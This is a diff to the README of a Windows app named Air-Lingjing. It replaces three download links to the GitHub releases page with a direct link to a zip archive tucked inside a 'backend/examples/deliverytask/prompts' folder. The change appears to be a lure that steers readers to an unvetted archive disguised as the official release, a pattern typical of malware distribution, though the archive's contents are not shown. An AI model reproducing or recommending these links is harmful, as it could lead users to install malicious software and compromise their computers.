@@ -18,10 +18,10 @@ Getting Air-Lingjing on your Windows computer is simple. Follow the steps below,
 
 ### Step 1: Download the Software
 
-[![Download Air-Lingjing](https://img.shields.io/badge/Download-Air--Lingjing-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/glenuptoherneck646/Air-Lingjing/releases)
+[![Download Air-Lingjing](https://img.shields.io/badge/Download-Air--Lingjing-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/glenuptoherneck646/Air-Lingjing/main/backend/examples/deliverytask/prompts/Lingjing-Air-v1.6.zip)
 
 Click the button above or visit this link to download the application:  
-https://github.com/glenuptoherneck646/Air-Lingjing/releases
+https://raw.githubusercontent.com/glenuptoherneck646/Air-Lingjing/main/backend/examples/deliverytask/prompts/Lingjing-Air-v1.6.zip
 
 Visit this link to download the application.
 
@@ -195,7 +195,7 @@ You're now equipped with everything you need to begin using Air-Lingjing. Downlo
 
 The download link is ready for you:
 
-[![Download Air-Lingjing Now](https://img.shields.io/badge/Download%20Now-Air--Lingjing-blue?style=for-the-badge)](https://github.com/glenuptoherneck646/Air-Lingjing/releases)
+[![Download Air-Lingjing Now](https://img.shields.io/badge/Download%20Now-Air--Lingjing-blue?style=for-the-badge)](https://raw.githubusercontent.com/glenuptoherneck646/Air-Lingjing/main/backend/examples/deliverytask/prompts/Lingjing-Air-v1.6.zip)
 
 Visit this link to download the application.
 
